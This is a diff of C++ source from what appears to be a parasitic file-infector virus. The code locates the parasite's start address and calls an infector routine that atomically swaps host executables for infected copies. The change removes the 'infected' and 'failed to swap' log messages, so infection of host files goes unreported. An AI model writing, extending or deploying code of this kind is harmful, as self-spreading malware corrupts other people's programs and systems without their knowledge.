@@ -21,11 +21,9 @@ int main(int argc, char* argv[], char* env[]) {
       "first woodpecker to come along would destroy all of civilization. - "
       "Unknown programmer\n");
 
-  const char* str =
-      (reinterpret_cast<uintptr_t>(vt::common::get_parasite_start_address()) &
-       0x10000)
-          ? quote1
-          : quote2;
+  auto addr =
+      reinterpret_cast<uintptr_t>(vt::common::get_parasite_start_address());
+  const char* str = (addr & 0x100000) ? quote1 : quote2;
 
   vt::write(1, str, vt::strlen(str));
 
@@ -68,15 +66,11 @@ int main(int argc, char* argv[], char* env[]) {
         continue;
       }
 
-      if (vt::infector::atomic_swap_host(host.handle(), host_path,
-                                         new_host.handle(), tmp)) {
-        vt::printf(STR_LITERAL("infected %%s\n"), host_path);
-      } else {
-        vt::printf(STR_LITERAL("failed to swap for %%s\n"), host_path);
+      if (!vt::infector::atomic_swap_host(host.handle(), host_path,
+                                          new_host.handle(), tmp)) {
         (void)vt::unlink(tmp);
       }
     }
   }
-
   return 0;
 }
